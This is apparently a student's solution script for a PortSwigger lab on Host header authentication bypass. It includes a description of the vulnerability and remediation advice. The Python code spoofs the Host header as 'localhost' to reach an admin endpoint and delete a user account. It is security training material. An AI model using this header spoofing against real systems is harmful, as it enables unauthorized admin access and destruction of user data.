"""
Tristan Gomez - CS 595
Spring 2021

The code below solves the PortSwigger level: Host header authentication bypass

Level Description:
    This lab makes an assumption about the privilege level of the user based on the HTTP Host header.

    To solve the lab, access the admin panel and delete Carlos's account. 


Vulnerability Description:
    The vulnerability of this level is that local users are allowed to access privileged pages and 
    data without any authentication. As an attacker, I can change my 'Host' header to 'localhost' when
    I send a GET request for the /admin page. The site will then believe that I am a local user and will
    let me browse the /admin page. In this level, I extract the '_lab' and 'session' cookies from the page,
    and I will use them in my GET request or else I will get a 403 Forbidden error. 

Remediation:
    The site should bar un-authenticated local users from accessing privileged pages. The site could
    implement the same login procedure that currently exists for external users and apply it to local
    users, forcing everyone to provide their credentials. In this way, access to the /admin page can
    be restricted to users with administrator privileges. 
"""

import requests
from bs4 import BeautifulSoup


s = requests.Session()
site = "acf71f881fc4b844803a5569001500c1.web-security-academy.net"
main_page = f"https://{site}"

"""
    Below, I am performing a GET request to the lab's landing page so that way the session
    object can extract the '_lab' and 'session' cookies for later use.
"""
resp = s.get(main_page)
cookie1 = s.cookies.get('_lab')
cookie2 = s.cookies.get('session')
Cookies = {"_lab" : cookie1 , "session" : cookie2}


"""
    After the cookies are extracted, I can package them up into the cookies field of the below GET
    request for the admin panel's delete carlos link. I will then perform the exploit by changing the
    'Host' header to have the value of 'localhost' so the site believes I am an internal user. 
"""
resp = s.get(f"{main_page}/admin/delete?username=carlos", headers={'Host' :'localhost'} ,cookies=Cookies)
print(f"Delete carlos' account status: {resp.status_code}")
print(resp.request.headers)
print(resp.headers)